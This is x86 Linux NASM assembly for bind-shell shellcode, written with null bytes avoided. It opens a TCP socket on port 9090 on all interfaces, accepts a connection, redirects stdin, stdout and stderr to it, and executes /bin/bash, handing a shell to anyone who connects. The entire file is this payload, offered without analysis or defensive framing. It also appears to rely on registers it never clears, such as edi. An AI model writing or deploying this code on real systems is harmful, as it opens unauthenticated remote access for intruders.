global _start
section .text
_start:
xor ebx , ebx                  ; xors all registers to avoid having "\x00"
xor eax ,eax
xor edx ,edx
xor ecx , ecx

mov al , 102                 ; socketcall system call = 102
mov bl , 1                   ; socket call type (SYS_SOCKET)
; Now pushing the arguments of socket()
push edi                        ; protocol
push byte 1                        ; SOCK_STREAM (tcp)
push byte 2                        ; AF_INET
mov ecx , esp                 ; pointer to the args
int 0x80                      ; interrupt
mov edx , eax                 ; save the socket file descriptor

mov al, 102                  ; syscall 102 - socketcall
mov bl, 2                    ; socketcall type (sys_bind 2)
;building the sockaddr struct: [AF_INET, 9090, INADDR_ANY]
push edi                        ; INADDR_ANY = 0, means listen on 0.0.0.0
push word 0x8223              ; port number.
push word 2                   ; AF_INET = 2.
mov ecx, esp                  ; pointer to the struct

push 16                ; sockaddr struct size = sizeof(struct sockaddr) = 16
push ecx               ; sockaddr_in struct pointer.
push edx               ; socket file descriptor.
mov ecx, esp           ; pointer to all bind arguments.
int 0x80

mov al, 102
mov bl, 4            ; socketcall type (sys_listen 4)
push edi                ; backlog.
push edx              ; socket file descriptor.
mov ecx, esp          ; pointer to arguments
int 0x80

mov al, 102
inc ebx			 ; socketcall type (sys_accept 5)
push edi                ; socklen_t *addrlen
push edi                ; sockaddr *addr
push edx              ; socket file descriptor.
mov ecx, esp
int 0x80

mov edx, eax     ; Here we saving the file descriptor of the client
;because we will use it in the duplication of the file descriptor.
mov al, 63      ; syscall dup2
mov ebx, edx     ; oldfd (client socket file descriptor).
xor ecx,ecx       ; stdin file descriptor.
int 0x80

mov al, 63
inc ecx         ; stdout file descriptor
int 0x80

mov al, 63
inc ecx         ; stderr file descriptor
int 0x80

mov al, 11             ; execve syscall
;args
push edi                  ; null
push 0x68736162         ; "bash"
push 0x2f2f2f2f         ; "////"
push 0x6e69622f         ; "/bin"
mov ebx, esp            ; pointer to "/bin////bash".
xor ecx,ecx              ; argv = null pointer
xor edx,edx              ; envp = null pointer
int 0x80

